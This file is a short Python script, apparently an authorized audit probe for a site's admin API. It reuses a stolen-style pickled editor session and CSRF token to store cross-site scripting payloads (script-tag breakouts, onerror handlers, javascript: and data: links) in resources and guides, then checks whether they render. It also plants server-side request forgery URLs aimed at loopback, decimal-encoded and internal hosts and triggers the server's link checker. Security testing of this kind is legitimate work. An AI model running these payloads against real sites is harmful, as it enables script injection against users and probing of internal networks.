import probe as p,requests,pickle,json
from bs4 import BeautifulSoup
s=requests.Session();s.cookies.update(pickle.loads((p.ROOT/'editor-cookies.private').read_bytes()))
r=p.req('editor-for-content','/admin/',session=s);csrf=p.data(r)['csrf']
marker='</script><script>window.__audit_xss="executed"</script><img src=x onerror="window.__audit_xss=1">'
obj=json.loads((p.ROOT/'resource-template.json').read_text());obj.update(id='audit-xss',title='Audit '+marker,summary=marker,details=marker+'\n\n[x](javascript:alert(1))\n\n[x](data:text/html;base64,PHNjcmlwdD4=)',image='x" onerror="window.__audit_xss=1')
p.req('xss-save-resource','/api/manage/','POST',s,data={'csrf':csrf,'action':'save-resource','version':'','resource':json.dumps(obj,ensure_ascii=False)},headers={'Origin':p.BASE})
p.req('xss-save-guide','/api/manage/','POST',s,data={'csrf':csrf,'action':'save-guide','version':'','slug':'audit-xss-guide','title':'Audit '+marker,'summary':marker,'body':marker+'\n\n[x](javascript:alert(1))\n\n[x](data:text/html,hello)\n\n</textarea><script>window.__audit_xss=2</script>'},headers={'Origin':p.BASE})
for n,path in enumerate(['/admin/preview/resources/audit-xss/','/admin/resources/audit-xss/','/admin/preview/guides/audit-xss-guide/','/admin/guides/audit-xss-guide/','/resources/audit-xss/','/guides/audit-xss-guide/','/sitemap.xml']):
 r=p.req('xss-view-'+str(n),path,session=s if path.startswith('/admin') else None)
 soup=BeautifulSoup(r.text,'html.parser')
 print('XSS DOM',path,'eventnodes',len(soup.select('[onerror],[onload]')),'injected-scripts',[x.text for x in soup.select('script') if '__audit_xss' in x.text][:4])
for n,url in enumerate(['https://127.0.0.1:4321/api/health/','https://[::1]:4321/api/health/','https://2130706433:4321/api/health/','https://sanjiang-audit-callback:9000/probe','https://localhost:8443/api/health/']):
 obj=json.loads((p.ROOT/'resource-template.json').read_text());obj.update(id='audit-tls-ssrf-'+str(n),title='Audit TLS SSRF '+str(n),url=url,sourceUrl=url)
 r=p.req('ssrf-tls-save-'+str(n),'/api/manage/','POST',s,data={'csrf':csrf,'action':'save-resource','version':'','resource':json.dumps(obj,ensure_ascii=False)},headers={'Origin':p.BASE})
 if r.status_code==303:
  r=p.req('ssrf-tls-check-'+str(n),'/api/manage/','POST',s,data={'csrf':csrf,'action':'check-link','id':obj['id']},headers={'Origin':p.BASE})
  print('SSRF TLS RESPONSE',BeautifulSoup(r.text,'html.parser').get_text(' ',strip=True)[:500])
  r=p.req('ssrf-tls-result-'+str(n),'/admin/resources/'+obj['id']+'/',session=s)
  print('SSRF TLS RESULT',BeautifulSoup(r.text,'html.parser').get_text(' ',strip=True)[-1700:])
